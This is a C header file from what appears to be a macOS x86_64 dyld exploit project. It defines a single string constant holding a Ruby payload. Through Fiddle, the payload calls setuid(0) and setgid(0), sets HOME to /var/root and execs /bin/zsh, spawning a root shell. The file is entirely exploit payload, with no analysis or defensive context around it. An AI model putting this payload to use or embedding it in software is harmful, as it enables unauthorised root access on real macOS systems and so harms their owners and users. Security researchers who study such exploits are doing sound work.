//
//  ruby_payload.h
//  dyldExploitMacOS_x86_64
//
//  Created by Linus Henze.
//  Copyright Â© 2021 Linus Henze. All rights reserved.
//

#ifndef ruby_payload_h
#define ruby_payload_h

char *ruby_payload_root_shell =
"require 'fiddle'\n"
"require 'fiddle/import'\n"
"\n"
"include Fiddle\n"
"include Fiddle::CParser\n"
"\n"
"libSystem = Fiddle.dlopen('/usr/lib/libSystem.B.dylib')\n"
"\n"
"setuid = Function.new(libSystem['setuid'], [parse_ctype('int')], parse_ctype('int'))\n"
"setgid = Function.new(libSystem['setgid'], [parse_ctype('int')], parse_ctype('int'))\n"
"execl = Function.new(libSystem['execl'], [parse_ctype('char *'), parse_ctype('char *'), parse_ctype('char *')], parse_ctype('int'))\n"
"exit = Function.new(libSystem['exit'], [parse_ctype('int')], parse_ctype('int'))\n"
"setenv = Function.new(libSystem['setenv'], [parse_ctype('char *'), parse_ctype('char *'), parse_ctype('int')], parse_ctype('int'))\n"
"\n"
"setuid.call(0)\n"
"setgid.call(0)\n"
"\n"
"setenv.call('HOME', '/var/root', 1)\n"
"execl.call('/bin/zsh', '/bin/zsh', Pointer.new(0))\n"
"\n"
"puts '[ruby] Failed to exec /bin/zsh!'\n"
"\n"
"exit.call(0)";

#endif /* ruby_payload_h */
